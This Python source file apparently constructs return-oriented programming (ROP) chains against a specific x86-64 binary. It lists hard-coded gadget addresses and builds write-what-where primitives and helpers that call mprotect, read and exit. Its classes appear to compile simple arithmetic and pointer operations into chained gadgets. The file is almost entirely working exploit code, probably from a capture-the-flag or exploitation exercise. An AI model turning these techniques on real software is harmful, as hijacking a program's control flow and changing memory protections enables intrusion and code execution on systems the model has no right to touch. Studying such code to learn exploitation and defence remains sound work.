#!/usr/bin/env python3

from json.tool import main
from exploiter import exploiter

ea_data = 0x00000000006C1060
exp = exploiter()

derefer_rax_rax = 0x000000000048fcf0 # mov rax, qword ptr [rax] ; add rsp, 8 ; ret
push_rcx        = 0x0000000000406F03 
pop_rax         = 0x000000000044db34
pop_rsp         = 0x0000000000463C64 # pop rsp ; ret
pop_rbp         = 0x0000000000419E7F # pop rbp ; ret
main_addr       = 0x0000000000401383 # push rbp ; mov rbp, rsp
mprotect_addr   = 0x0000000000435690 
read_addr       = 0x0000000000434B20
exit_addr       = 0x0000000000407A50
nop_gadet       = 0x0000000000408B87

def ret2_exit(exit_code):
    rdi_equ(exit_code)

    exp.add_gadet(exit_addr)

def ret2_read(fd, buf, count):
    rdi_equ(fd)
    rsi_equ(buf)
    rdx_equ(count)

    exp.add_gadet(read_addr)

def ret2_mprotect(addr, _len, prot):
    rdi_equ(addr)
    rsi_equ(_len)
    rdx_equ(prot)
    exp.add_gadet(mprotect_addr)

def rbp_equ(val):
    exp.add_gadet(pop_rbp) # pop rbp ; ret
    exp.add_gadet(val)

def goto_main():
    exp.add_gadet(main_addr)

def rsp_equ(val):
    exp.add_gadet(pop_rsp) # pop rsp ; ret
    exp.add_gadet(val)

def add_rax_3():
    exp.add_gadet(0x0000000000463ba0)

def add_rax_2():
    exp.add_gadet(0x0000000000463b87)

def add_rax_8():
    add_rax_3()
    add_rax_3()
    add_rax_2()


def mov_rcx_rax(pre):
    ex_write_what_where(rsi_where=pre.TEMP1)
    rdi_equ(pre.TEMP1)
    rdx_equ(pre.TRASH1)
    exp.add_gadet(0x000000000040F170) # mov rcx, qword ptr [rdi] ; mov qword ptr [rdx], rcx ; ret

# Side-Effect: Changes rbx
def mov_rsi_rax(pre):
    mov_rcx_rax(pre)
    
    # Save rax
    ex_write_what_where(rsi_where=pre.TEMP1)
    rax_equ(256)
    
    # Set eflags to 0
    sub_rax_1()

    # Prepare rdx for variable
    exp.add_gadet(0x000000000040DDF8) # mov rsi, rcx ; jbe ...
    exp.add_gadet(0x1122334455667788) # padding for pop rbx
    # movzx eax, byte ptr [rdx] ; pop rbx ; ret

    # finally restore rax
    read_toRAX(pre.TEMP1)

def marker():
    exp.add_gadet(0x000000000046452F)

def sub_rax_1():
    exp.add_gadet(0x0000000000433613)

def sub_rax_n(n):
    for x in range(n):
        sub_rax_1()

def ex_write_what_where(rax_what=None, rsi_where=None):
    if rsi_where is not None:
        rsi_equ(rsi_where)

    if rax_what is not None:
        rax_equ(rax_what)

    exp.add_gadet(0x0000000000470f11) # mov qword ptr [rsi], rax ; ret

def rdi_equ(val):
    exp.add_gadet(0x0000000000401b73)
    exp.add_gadet(val)

def rdx_equ(val):
    exp.add_gadet(0x0000000000437A85)
    exp.add_gadet(val)

def rax_equ(val):
    exp.add_gadet(0x000000000044db34) # pop rax ; ret
    exp.add_gadet(val)


def rsi_equ(val):
    exp.add_gadet(0x0000000000401c87) # pop rsi ; ret
    exp.add_gadet(val)


def qword_convert(ea_start, position):
    return ea_start + position * 8


def write_what_where(ea, value):
    global exp

    rsi_equ(ea)             
    rax_equ(value)

    exp.add_gadet(0x0000000000470f11)


def write_what_where_RAX(ea):
    global exp

    rsi_equ(ea)             

    exp.add_gadet(0x0000000000470f11)


def add_eax_to_ebx():
    global exp
    
    exp.add_gadet(0x0000000000474f21) # add ebx, eax ; nop dword ptr [rax + rax] ; xor eax, eax ; ret

def exchange_eax_ebx():
    global exp
   
    exp.add_gadet(0x0000000000459339) # xchg eax, ebx ; ret


def follow_rax_rax():
    global derefer_rax_rax
    
    exp.add_gadet(derefer_rax_rax)
    # Add padding for add rsp
    exp.add_gadet(0x0000000000000000)


def read_toRAX(ea):
    global derefer_rax_rax

    rax_equ(ea)
    exp.add_gadet(derefer_rax_rax)
    # Add padding for add rsp
    exp.add_gadet(0x0000000000000000)


def finalize():
    global exp
    
    exp.finish()


class PRE_ASSIGNMENT:
    def __init__(self, addr, value) -> None:
        write_what_where(addr, value)


# 32 bit
# TODO: Refactor
class ADDITION:
    def __init__(self, pre, lvar_name, rvar_name) -> None:
        l_addr, r_addr = pre.variable_address(lvar_name), pre.variable_address(rvar_name)

        # Prepare lvar and rvar
        read_toRAX(l_addr)
        write_what_where_RAX(pre.LVAR)
        read_toRAX(r_addr)
        write_what_where_RAX(pre.RVAR)

        # Do addition 
        read_toRAX(pre.LVAR)
        exchange_eax_ebx()
        read_toRAX(pre.RVAR)
        add_eax_to_ebx()
        exchange_eax_ebx()

        # Write to result variable and lvar
        write_what_where_RAX(pre.MATH_RES)
        write_what_where_RAX(l_addr)


class MOVE_PTR:
    def __init__(self, pre, dir) -> None:
        # Read to RAX variables ptr
        read_toRAX(pre.VAR_PTR)

        # Do move
        if dir:
            add_rax_8()
        else:
            sub_rax_n(8)

        ex_write_what_where(rsi_where=pre.VAR_PTR)

# 32 Bit
# Side-Effect: Changes rbx
class ADD_PTR:
    def __init__(self, pre, positive) -> None:
        # Read to RAX variables ptr
        read_toRAX(pre.VAR_PTR)

        # Dereference
        follow_rax_rax()

        # Do math
        if positive:
            add_rax_2()
            sub_rax_1()
        else:
            sub_rax_1()

        # RAX holds answer, save in temp1
        ex_write_what_where(rsi_where=pre.TEMP2)

        # Move ptr to rsi for write
        read_toRAX(pre.VAR_PTR)
        mov_rsi_rax(pre)
        read_toRAX(pre.TEMP2)
        ex_write_what_where()

class RETURN_TO_MAIN:
    def __init__(self) -> None:
        goto_main()
